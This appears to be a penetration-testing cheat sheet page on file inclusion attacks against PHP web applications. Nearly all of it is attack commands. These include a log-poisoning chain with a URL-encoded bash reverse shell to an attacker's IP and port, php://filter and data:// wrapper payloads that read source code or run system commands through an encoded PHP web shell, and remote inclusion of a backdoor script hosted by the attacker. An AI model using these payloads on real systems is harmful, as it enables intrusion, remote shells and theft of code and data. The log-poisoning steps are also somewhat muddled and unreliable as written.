---
title: File Inclusion
description: External insertion of files, potentially executing malicious code or accessing sensitive data.
tags:
  - Exploitation
  - Web
---

### RCE with LFI via Log poisoning

```bash
# 1. Find apache log file.
curl http://example.com?page=../../../../../../../../../var/log/apache2/access.log

# 2. Insert our payload inside it.
curl http://example.com?page=../../../../../../../../../var/log/apache2/access.log?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$ip%2F$port%200%3E%261%22

# 3. Display the poisoned log file.
curl http://example.com?page=../../../../../../../../../var/log/apache2/access.log
```

---

### Use PHP Wrappers in LFI

```bash Retrieve source code via php wrappers.
http://example.com?page=php://filter/convert.base64-encode/resource=index.php

# Decode base64
echo $base64 | base64 -d
```

---

```Use php wrappers to execute command.
http://example.com?page=data://text/plain,<?php%20echo%20system('payload');?>
http://example.com?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=payload"
``` 

---

### RFI

```powershell
http://example.com?page=http://$ip:$port/simple-backdoor.php&cmd=payload"
``` 